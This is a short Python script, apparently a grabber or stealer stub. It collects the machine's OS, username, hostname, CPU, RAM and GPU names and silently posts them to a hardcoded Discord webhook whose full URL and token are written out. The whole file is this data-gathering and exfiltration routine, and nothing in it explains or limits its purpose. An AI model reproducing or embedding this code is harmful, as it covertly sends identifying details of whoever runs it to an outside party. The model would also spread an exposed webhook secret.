import requests
import platform
import socket
import getpass
import psutil
import GPUtil

url = 'https://discord.com/api/webhooks/1387175086167167256/7-HwZRGSjupcQQVb2gnAqQQj3ctW8C-rHMzyjuQgDXKOeMUzCXvKV1dVYBAJ3ZsdV3h6'

os_info = platform.platform()
username = getpass.getuser()
hostname = socket.gethostname()
cpu = platform.processor()
ram = round(psutil.virtual_memory().total / (1024**3), 2)

gpus = GPUtil.getGPUs()
gpu_info = ', '.join([gpu.name for gpu in gpus]) if gpus else 'No GPU found'

message = f"""**System Info**
OS: {os_info}
Username: {username}
PC Name: {hostname}
CPU: {cpu}
RAM: {ram} GB
GPU: {gpu_info}"""

requests.post(url, json={'content': message})
